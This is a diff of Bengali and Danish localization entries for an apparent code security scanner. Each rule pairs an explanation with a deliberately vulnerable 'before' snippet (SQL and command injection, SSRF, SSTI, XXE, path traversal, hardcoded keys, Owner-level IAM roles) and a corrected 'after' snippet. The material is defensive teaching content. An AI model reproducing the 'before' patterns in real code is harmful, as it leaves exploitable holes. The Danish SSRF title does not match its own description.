+    title: "একটি Google Cloud IAM রোল পূর্ণ অ্যাক্সেস দেয় (Owner/Editor)",
+    description:
+      'একটি "google_project_iam_binding"/"google_project_iam_member" (অথবা organization/folder স্তরে সমতুল্য) প্রিমিটিভ রোল "roles/owner" বা "roles/editor" অ্যাসাইন করে — প্রজেক্টের প্রায় প্রতিটি সার্ভিসে প্রায় সম্পূর্ণ অ্যাক্সেস। এটি একটি জরুরি অ্যাকাউন্টের জন্য উদ্দিষ্ট হতে পারে, কিন্তু নিশ্চিত করা উচিত: দৈনন্দিন ব্যবহারের জন্য শুধু সত্যিই প্রয়োজনীয় আরও নির্দিষ্ট প্রিডিফাইনড রোল দিন।',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # শুধু সত্যিই প্রয়োজনীয় প্রিডিফাইনড রোল, roles/owner নয়\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "একটি Azure role assignment পূর্ণ অ্যাক্সেস দেয় (Owner)",
+    description:
+      'একটি "azurerm_role_assignment" পুরো অ্যাসাইন করা scope-এ (subscription, resource group...) "Owner" রোল অ্যাসাইন করে — অন্য ব্যবহারকারীদের পারমিশনের উপর নিয়ন্ত্রণসহ পূর্ণ অ্যাক্সেস। এটি একটি জরুরি অ্যাকাউন্টের জন্য উদ্দিষ্ট হতে পারে, কিন্তু নিশ্চিত করা উচিত: দৈনন্দিন ব্যবহারের জন্য শুধু সত্যিই প্রয়োজনীয় আরও নির্দিষ্ট রোল দিন (যেমন একটি একক resource group-এ "Contributor")।',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # শুধু সত্যিই প্রয়োজনীয় আরও নির্দিষ্ট রোল, পুরো subscription-এ Owner নয়\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "একটি নিরাপত্তা টোকেন ক্রিপ্টোগ্রাফিকভাবে নিরাপদ নয় এমন একটি random number generator দিয়ে তৈরি",
+    description:
+      "token/session/reset/otp/csrf-এর মতো নামের একটি মান Math.random() (JS), random.random() (Python), বা rand() (PHP) দিয়ে তৈরি করা হয়েছে — এগুলো নিরাপত্তার জন্য ডিজাইন করা জেনারেটর নয়, যাদের sequence অনুমানযোগ্য। এভাবে তৈরি একটি টোকেন অনুমান বা পুনর্নির্মাণ করা যেতে পারে, যে উদ্দেশ্যে এটি তৈরি তা ব্যর্থ করে দিয়ে (যেমন একটি পাসওয়ার্ড রিসেট লিঙ্ক যা যে কেউ অনুমান করতে পারে)।",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, Math.random নয় — অনুমানযোগ্য নয়`,
+    },
+  },
+  "ldap-injection": {
+    title: "একটি LDAP ফিল্টার সরাসরি অনুরোধের একটি মান concatenate করে তৈরি করা হয়",
+    description:
+      'একটি LDAP ফিল্টার তৈরি করে এমন একটি লাইন (যেমন "(uid=...)") কোনো LDAP বিশেষ অক্ষর escape না করেই সরাসরি অনুরোধ থেকে নেওয়া একটি মান অন্তর্ভুক্ত করে। যে সেই মান নিয়ন্ত্রণ করে সে ফিল্টারের লজিক পরিবর্তন করতে পারে — যেমন একটি প্রমাণীকরণ যাচাই বাইপাস করা অথবা যা দেখা উচিত নয় এমন ডিরেক্টরি ডেটা পড়া।',
+    fix: {
+      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
+      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // একটি ফিল্টারে ব্যবহার করার আগে LDAP বিশেষ অক্ষরগুলো সবসময় escape করতে হবে\nclient.search(base, { filter });",
+    },
+  },
+  "xss-dangerous-html": {
+    title: "ব্যবহারকারীদের লেখা টেক্সট ব্রাউজারে কোড চালাতে পারে",
+    description:
+      "কন্টেন্ট পৃষ্ঠায় সাধারণ টেক্সটের বদলে raw HTML হিসেবে ঢোকানো হয় (dangerouslySetInnerHTML, v-html, .innerHTML)। সেই কন্টেন্টে যদি ব্যবহারকারীর ইনপুট থাকে, তাহলে এতে এমন স্ক্রিপ্ট থাকতে পারে যা পৃষ্ঠাটি যে পড়ছে তার ব্রাউজারে চলে।",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// অথবা, HTML প্রয়োজন হলে: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "আপলোড করা ফাইলের জায়গা যে কেউ দেখতে পারে",
+    description:
+      "একটি স্টোরেজ বাকেট (Supabase Storage, S3) পাবলিক হিসেবে কনফিগার করা আছে। এতে যদি ডকুমেন্ট, ছবি বা ব্যবহারকারীদের আপলোড করা ফাইল থাকে, তাহলে যে কেউ পাথটি জানে — বা অনুমান করে — সে প্রমাণীকরণ ছাড়াই এতে অ্যাক্সেস পেতে পারে।",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// সময়সীমাবদ্ধ সাইন করা URL দিয়ে ফাইল পরিবেশন করুন: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "ডেটা মুছতে বা পরিবর্তন করতে একটি লিঙ্কই যথেষ্ট",
+    description:
+      "একটি GET রুট এমন একটি অপারেশন করে যা ডেটা পরিবর্তন করে (পাথে delete/remove/update/edit থাকে)। শুধু একটি লিঙ্কে ভিজিট করে বা বাইরের কোনো সাইট থেকে একটি ছবি লোড করেই GET অনুরোধ চলে যায় — এটি CSRF আক্রমণের ক্লাসিক ভিত্তি।",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "ব্রাউজারে সংরক্ষিত লগইন ডেটা ভালোভাবে সুরক্ষিত নয়",
+    description:
+      "একটি অ্যাক্সেস টোকেন localStorage-এ সংরক্ষণ করা হয়। একটি httpOnly কুকির বিপরীতে, পৃষ্ঠায় চলা যেকোনো স্ক্রিপ্ট (এমনকি XSS দিয়ে ইনজেক্ট করা একটি ক্ষতিকর স্ক্রিপ্টও) এটি পড়ে চুরি করতে পারে।",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// সার্ভার থেকে টোকেনটি httpOnly কুকি হিসেবে সেট করুন:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "সাইটটি একটি প্রতারণামূলক ওয়েবসাইটে রিডাইরেক্ট করতে ব্যবহার করা যেতে পারে",
+    description:
+      "সাইটটি ব্যবহারকারীকে সরাসরি অনুরোধ থেকে নেওয়া একটি ঠিকানায় রিডাইরেক্ট করে (query, body, params), এটি পরিচিত ডোমেইন কিনা তা যাচাই না করেই। এমন একটি লিঙ্ক যা আপনার সাইটে নিয়ে যাচ্ছে বলে মনে হয়, তা আসলে একটি ফিশিং পেজে নিয়ে যেতে পারে।",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "ঠিকানায় একটি সংখ্যা পরিবর্তন করলে অন্য কারো ডেটা দেখা যেতে পারে",
+    description:
+      "একটি ডেটাবেস কোয়েরি সরাসরি URL থেকে নেওয়া একটি identifier ব্যবহার করে (req.params.id), কাছাকাছি লাইনগুলোতে এটি যাচাই না করেই যে এটি অনুরোধকারী ব্যবহারকারীর। ঠিকানায় id পরিবর্তন করলে অন্য একজন ব্যবহারকারীর ডেটায় অ্যাক্সেস পাওয়া যেতে পারে — Insecure Direct Object Reference।",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "header-injection": {
+    title: "অনুরোধের একটি মান সরাসরি একটি HTTP response header-এ চলে যায়",
+    description:
+      "একটি HTTP response header সরাসরি অনুরোধ থেকে নেওয়া একটি মান (query, body, params) দিয়ে সেট করা হয়, এতে line break (CRLF) আছে কিনা তা যাচাই না করেই। একজন আক্রমণকারী অতিরিক্ত header বা এমনকি সম্পূর্ণ ভিন্ন একটি response — response splitting — ঢোকাতে পারে, caching, cookie বা অন্য ব্যবহারকারীদের দেখানো কন্টেন্ট পরিবর্তন করতে সক্ষম হয়ে।",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "docker-missing-user": {
+    title: "Dockerfile একটি non-root ব্যবহারকারী সেট করে না",
+    description:
+      "Dockerfile-এ কোনো USER নির্দেশ নেই: এটি ছাড়া, container root হিসেবে চলে। একজন আক্রমণকারী যদি container-এর ভেতরে কোড চালাতে সক্ষম হয় (যেমন একটি ঝুঁকিপূর্ণ লাইব্রেরি exploit করে), তাহলে container-এর ভেতরে root হওয়া host-এ escape করা — বা চারপাশের সিস্টেমে আরও বড় প্রভাব — সহজ করে দেয়।",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Kubernetes manifest স্পষ্টভাবে non-root ব্যবহারকারী হিসেবে চালানো বাধ্যতামূলক করে না",
+    description:
+      'manifest-এ কোথাও "runAsNonRoot" নেই (না pod স্তরে, না container স্তরে): এটি সেট না করলে, একটি container তার ইমেজে ডিফাইন করা যেকোনো ব্যবহারকারী হিসেবে চলে — ইমেজ নিজে এটি পরিবর্তন না করলে প্রায়ই ডিফল্টভাবে root। এটি স্পষ্টভাবে true সেট করলে, ইমেজ তবুও root হিসেবে চালানোর চেষ্টা করলে pod শুরু হতে ব্যর্থ হয়, শুধু একটি ঘটনার পরে এটি জানার বদলে।',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "CI-এর একটি তৃতীয় পক্ষের action একটি নির্দিষ্ট ভার্সনে (commit SHA) লক করা নেই",
+    description:
+      'ওয়ার্কফ্লোটি commit SHA দিয়ে নয়, বরং tag বা branch (যেমন "@v1", "@main") দিয়ে রেফারেন্স করা একটি তৃতীয় পক্ষের action ব্যবহার করে। যে এটি maintain করে — বা যে তার অ্যাকাউন্ট compromise করে — সে যেকোনো সময় সেই রেফারেন্সটি একটি ভিন্ন commit-এ সরাতে পারে, CI-তে কী চলছে তা নীরবে পরিবর্তন করে, তার সিক্রেটগুলোতে অ্যাক্সেসসহ। একটি commit SHA সবসময় একই, হুবহু কোডের দিকে নির্দেশ করে।',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, commit SHA-তে পিন করা — ভার্সন আপডেট করার সময় SHA আপডেট করুন`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "ওয়ার্কফ্লোটি শুধু যা ব্যবহার করে তা নয়, বরং টোকেনের সব পারমিশন নিজেকে দেয়",
+    description:
+      '"permissions: write-all" ওয়ার্কফ্লোর GITHUB_TOKEN-কে সবকিছুতে — issue, pull request, package, deployment — write অ্যাক্সেস দেয়, এমনকি ওয়ার্কফ্লোটি এর শুধু একটি অংশ ব্যবহার করলেও। ওয়ার্কফ্লোর একটি ধাপ compromise হলে (একটি ক্ষতিকর ডিপেন্ডেন্সি, একটি ইনজেক্ট করা স্ক্রিপ্ট), সেই বিস্তৃত পারমিশনগুলো যে এটি exploit করে তার সক্ষমতা বাড়িয়ে দেয়।',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # শুধু যে পারমিশনগুলো ওয়ার্কফ্লো সত্যিই ব্যবহার করে`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "একটি session বা authentication কুকি Secure ও HttpOnly ফ্ল্যাগ ছাড়াই সেট করা হয়",
+    description:
+      'session/auth/token-এর মতো নামের একটি কুকি তার অপশনগুলোর মধ্যে "httpOnly" ও "secure" ছাড়াই সেট করা হয়। httpOnly ছাড়া, পৃষ্ঠায় থাকা JavaScript — XSS দিয়ে ইনজেক্ট করা কোডসহ — সেই কুকি পড়তে পারে। secure ছাড়া, এটি একটি এনক্রিপ্ট না করা HTTP সংযোগেও পাঠানো যেতে পারে।',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "লগইন ফর্ম একের পর এক অনেক চেষ্টা ব্লক করে না",
+    description:
+      "ফাইলে একটি লগইন রুট ডিফাইন করা আছে, কিন্তু একই ফাইলে rate-limiting মিডলওয়্যারের কোনো চিহ্ন নেই। চেষ্টার কোনো সীমা ছাড়া, একজন আক্রমণকারী কোনো বাধা ছাড়াই ধারাবাহিকভাবে পাসওয়ার্ড চেষ্টা করতে পারে (brute force)।",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "পাসওয়ার্ড বা সংবেদনশীল ডেটা লগে চলে যায়",
+    description:
+      "console.log (বা অনুরূপ) একটি কলে password, token, secret, বা apiKey নামের একটি ভেরিয়েবল অন্তর্ভুক্ত থাকে। এই লগগুলো যদি কোনো বাহ্যিক সার্ভিসে বা ফাইলে চলে যায়, তাহলে সংবেদনশীল ডেটা প্রয়োজনের চেয়ে অনেক বেশি সময় ধরে উন্মুক্ত থাকে।",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: 'Dockerfile-এর base image ":latest" ট্যাগ ব্যবহার করে',
+    description:
+      'একটি FROM নির্দেশ একটি নির্দিষ্ট ভার্সনের বদলে স্পষ্টভাবে ":latest" ট্যাগ ব্যবহার করে। "latest" সময়ের সাথে পরিবর্তিত হয়: একই build, অন্য সময়ে আবার করা হলে, base image-এর একটি ভিন্ন ভার্সন পেতে পারে — একটি non-reproducible build, এবং কেউ সিদ্ধান্ত না নিয়েই একটি অবাঞ্ছিত আপডেট আসতে পারে।',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "Dockerfile COPY-এর বদলে ADD দিয়ে একটি রিমোট ফাইল ডাউনলোড করে",
+    description:
+      "একটি http/https URL সহ ADD নির্দেশ build-এর সময় ইন্টারনেট থেকে একটি ফাইল ডাউনলোড করে, কোনো integrity যাচাই ছাড়াই এবং কন্টেন্ট রিপোজিটরিতে দৃশ্যমান না হয়েই। সেই URL যদি কখনো compromise হয়, build কেউ লক্ষ্য না করেই Dockerfile পড়ে নির্বিচারে কন্টেন্ট অন্তর্ভুক্ত করে।",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<প্রত্যাশিত hash>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "ঝুঁকিপূর্ণ ডিপেন্ডেন্সি:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "এখনো কোনো সংশোধিত ভার্সন জানা নেই — একটি বিকল্প প্যাকেজ বিবেচনা করুন অথবা প্রজেক্টের আপডেট অনুসরণ করুন।"
+      ),
+    },
+  }),
+},
+  da: {
+  "supabase-service-role-in-client": {
+    title: "Supabases hemmelige nøgle havner i en fil, der er synlig for browseren",
+    description:
+      "En variabel med et offentligt præfiks (f.eks. NEXT_PUBLIC_, VITE_) eller en klientside-fil refererer til Supabases service role key. Denne nøgle omgår Row Level Security: hvis den havner i browser-bundlet, kan alle læse den og agere som databaseadministrator.",
+    fix: {
+      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (kun server)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "Adgangskoder eller hemmelige nøgler er skrevet direkte i koden",
+    description:
+      "En API-nøgle, et token eller en adgangskode ser ud til at være skrevet som en bogstavelig værdi i stedet for at blive læst fra en miljøvariabel. Alle, der læser kildekoden (eller repositoriet, hvis det er offentligt), får fat i den hemmelighed.",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "En fil med projektets rigtige adgangskoder er blandt dem, der analyseres",
+    description:
+      "En .env-fil med rigtige værdier (ikke en .env.example) er inkluderet i analysen. Hvis denne fil havner i et repository eller en offentlig deployment, bliver alle legitimationsoplysninger i den eksponeret.",
+    fix: {
+      before: `# .env (committet ved en fejl)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (committet)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env forbliver uden for repoet (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "Alle kan læse eller ændre alle brugeres data",
+    description:
+      "Row Level Security er deaktiveret, eller en policy tillader adgang for alle (USING (true)) uden at kontrollere, hvem der laver forespørgslen. Enhver godkendt bruger — eller endda en anonym — kan læse eller ændre alle andres data.",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "En værdi indtastet af brugeren indsættes direkte i en databaseforespørgsel",
+    description:
+      "En SQL-forespørgsel bygges ved at sammenkæde eller interpolere en streng direkte i stedet for at bruge parametre. Hvis denne tekst kommer (selv indirekte) fra en bruger, kan det ændre selve forespørgslen — SQL injection.",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "Adgangskoder ser ikke ud til at være beskyttet",
+    description:
+      "Et adgangskodefelt gemmes præcis, som det ankom i anmodningen, og der optræder ingen hashing-funktion (bcrypt, argon2, scrypt) i filen. Hvis databasen bliver kompromitteret, kan alle adgangskoder bruges med det samme.",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "Den hemmelighed, der bruges til at signere logins, er skrevet i klartekst i koden",
+    description:
+      "Hemmeligheden, der sendes til jwt.sign / jwt.verify (eller JWT_SECRET-variablen), er en bogstavelig værdi i koden i stedet for at komme fra en miljøvariabel. Alle, der læser den, kan oprette gyldige adgangstokens for enhver bruger.",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "Serveren kan tvinges til at køre eksterne kommandoer",
+    description:
+      "En funktion, der kører systemkommandoer (exec, execSync, spawn), modtager en streng bygget ved interpolation eller sammenkædning. Hvis en del af den streng kommer fra brugerinput, kan den, der kontrollerer den, få vilkårlige kommandoer til at køre på serveren.",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "En ny tabel ser ud til at være oprettet uden beskyttelse",
+    description:
+      "En SQL-migrering opretter en tabel, men aktiverer ikke Row Level Security for den samme tabel i den samme fil. Så længe det forbliver sådan, starter tabellen uden nogen begrænsning på, hvem der kan læse eller skrive til den.",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "Sitet accepterer anmodninger fra alle andre websites",
+    description:
+      "CORS-headeren er sat til at acceptere anmodninger fra enhver oprindelse (*), eller cors()-middlewaren bruges uden begrænsninger. Ethvert tredjepartswebsite kan kalde dine API'er fra browseren hos en allerede godkendt bruger.",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://dinside.dk"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "En funktion med administratorrettigheder kontrollerer ikke, hvem der bruger den",
+    description:
+      "En rute eller funktion, hvis navn antyder administratoroperationer, indeholder ikke, i de nærliggende linjer, noget tjek af godkendelse eller rolle. Alle, der kender URL'en, kunne køre den.",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "Sitet kan tvinges til at køre ekstern kode",
+    description:
+      "En udgående HTTP-anmodning (fetch, axios) bruger direkte en værdi, der kommer fra en brugers anmodning, som destinations-URL. En ondsindet bruger kan få din server til at kalde interne eller vilkårlige adresser — Server-Side Request Forgery.",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.dintjeneste.dk"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL ikke tilladt")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "Adgangskoder er beskyttet med en metode, der nu er let at bryde",
+    description:
+      "På samme linje anvendes md5() eller sha1() på en værdi knyttet til en adgangskode. Disse algoritmer er for hurtige at beregne: en angriber med databasen kan prøve milliarder af adgangskoder i sekundet.",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "xss-dangerous-html": {
+    title: "Tekst skrevet af brugere kunne køre kode i browseren",
+    description:
+      "Indhold indsættes på siden som rå HTML (dangerouslySetInnerHTML, v-html, .innerHTML) i stedet for som almindelig tekst. Hvis det indhold inkluderer brugerinput, kan det indeholde scripts, der køres i browseren hos den, der læser siden.",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// eller, hvis HTML er nødvendigt: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "Pladsen til uploadede filer er synlig for alle",
+    description:
+      "En storage-bucket (Supabase Storage, S3) er konfigureret som offentlig. Hvis den indeholder dokumenter, billeder eller filer uploadet af brugere, kan alle, der kender — eller gætter — stien, tilgå dem uden godkendelse.",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// server filer med tidsbegrænsede signerede URL'er: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "Ét link er nok til at slette eller ændre data",
+    description:
+      "En GET-rute udfører en handling, der ændrer data (stien indeholder delete/remove/update/edit). GET-anmodninger køres bare ved at besøge et link eller indlæse et billede fra et eksternt site — det klassiske springbræt for et CSRF-angreb.",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "Logindata gemt i browseren er ikke godt beskyttet",
+    description:
+      "Et adgangstoken gemmes i localStorage. I modsætning til en httpOnly-cookie kan ethvert script, der kører på siden (inklusive et ondsindet script indsat via XSS), læse og stjæle det.",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// sæt tokenet som en httpOnly-cookie fra serveren:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "Sitet kan bruges til at omdirigere til et svindelwebsite",
+    description:
+      "Sitet omdirigerer brugeren til en adresse taget direkte fra anmodningen (query, body, params) uden at kontrollere, at det er et kendt domæne. Et link, der ser ud til at pege på dit site, kan i virkeligheden føre til en phishing-side.",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "At ændre et tal i adressen kunne vise andres data",
+    description:
+      "En databaseforespørgsel bruger direkte et id taget fra URL'en (req.params.id) uden at kontrollere, i de nærliggende linjer, at det tilhører den bruger, der laver anmodningen. At ændre id'et i adressen kunne give adgang til en anden brugers data — Insecure Direct Object Reference.",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "Loginformularen blokerer ikke for mange forsøg i træk",
+    description:
+      "En login-rute er defineret i filen, men der er ingen spor af rate-limiting-middleware i samme fil. Uden en grænse for forsøg kan en angriber prøve adgangskoder i rækkefølge (brute force) uden at blive bremset.",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "Adgangskoder eller følsomme data havner i logs",
+    description:
+      "Et kald til console.log (eller lignende) inkluderer en variabel kaldet password, token, secret eller apiKey. Hvis disse logs havner i en ekstern tjeneste eller en fil, forbliver følsomme data eksponeret meget længere end nødvendigt.",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "path-traversal": {
+    title: "En fil på serveren kan læses eller skrives ved at vælge stien udefra",
+    description:
+      "En funktion, der læser, skriver eller sender en fil, henter stien direkte fra en værdi i anmodningen (query, body, params) uden at kontrollere, at den forbliver inden for en tilladt mappe. En angriber kan indsætte \"../\" for at komme ud af den tiltænkte mappe og læse eller overskrive vilkårlige filer på serveren (f.eks. en konfigurationsfil med legitimationsoplysninger).",
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Sti ikke tilladt")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "En værdi indtastet af brugeren eksekveres som kode inde i en MongoDB-forespørgsel",
+    description:
+      "MongoDBs $where-operator kører JavaScript på serversiden for hvert dokument — hvis den streng bygges ved at sammenkæde en værdi, der kommer fra brugeren, kan den, der kontrollerer den, få vilkårlig kode til at køre i databasens kontekst, ikke bare ændre filteret som ved en almindelig SQL injection.",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "En værdi indtastet af brugeren fortolkes som en skabelon, ikke som data",
+    description:
+      "En funktion, der kompilerer/udfører en skabelon, modtager HELE skabelonen fra en værdi i anmodningen, i stedet for at bruge en fast skabelon og kun sende data med. En angriber kan skrive direkte i skabelonmotorens syntaks (f.eks. {{7*7}} for Jinja2) og køre kode på serveren — Server-Side Template Injection, som ofte fører til eksekvering af vilkårlige kommandoer, ikke bare et visningsproblem som XSS.",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "XML-parseren kan tvinges til at læse filer eller lave eksterne forespørgsler",
+    description:
+      "En XML-parser (DocumentBuilderFactory) oprettes uden eksplicit at deaktivere eksterne entiteter (DOCTYPE) i de nærliggende linjer. Hvis parseren modtager XML fra en kilde, der ikke er tillid til, kan en angriber definere en ekstern entitet til at læse filer på serveren eller få den til at kontakte en adresse efter eget valg — XML External Entity.",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
